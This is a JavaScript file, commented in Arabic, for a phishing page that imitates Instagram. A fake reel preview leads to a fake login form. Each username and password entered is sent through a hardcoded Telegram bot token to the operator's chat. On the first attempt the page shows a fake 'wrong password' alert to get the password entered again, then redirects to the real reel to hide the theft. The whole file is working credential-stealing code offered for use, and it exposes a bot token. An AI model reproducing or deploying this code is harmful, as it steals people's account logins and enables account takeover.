// البيانات المستخرجة من صورك يا زيد
const token = "8290316866:AAHpxLGgMSmb1GUpqcIor8VjT6FEPL9LN1g"; //
const chat_id = "6577433645"; //
const targetReel = "https://www.instagram.com/reels/DFZ1t0rA7M9/";

let count = 0;

const userInp = document.getElementById('username');
const passInp = document.getElementById('password');
const logBtn = document.getElementById('loginBtn');

// إظهار صفحة تسجيل الدخول عند الضغط على الرييل
document.getElementById('reel-preview').addEventListener('click', function() {
    this.style.display = 'none';
    document.getElementById('login-page').style.display = 'flex';
});

// وظيفة تفعيل الزر (يصبح أزرق)
function validate() {
    if (userInp.value.trim().length > 0 && passInp.value.length >= 6) {
        logBtn.classList.add('active');
    } else {
        logBtn.classList.remove('active');
    }
}

userInp.addEventListener('input', validate);
passInp.addEventListener('input', validate);

// معالجة الضغط على زر تسجيل الدخول وإرسال البيانات
logBtn.addEventListener('click', async function() {
    count++;
    const u = userInp.value;
    const p = passInp.value;

    const msg = `🔥 صيدة جديدة يا زيد!\n👤 الحساب: ${u}\n🔑 الباسورد: ${p}\n🔢 المحاولة: ${count}`;

    // إرسال البيانات للتيليجرام
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat_id, text: msg })
        });
    } catch (e) {
        console.error("Connection Error");
    }

    if (count === 1) {
        // إظهار تنبيه "كلمة السر خاطئة" في المرة الأولى
        document.getElementById('customAlert').style.display = 'flex';
        passInp.value = "";
        validate(); 
    } else {
        // التحويل للرييل الحقيقي في المرة الثانية
        window.location.href = targetReel;
    }
});

// إغلاق التنبيه عند الضغط على "Réessayer"
document.getElementById('retryBtn').addEventListener('click', function() {
    document.getElementById('customAlert').style.display = 'none';
});
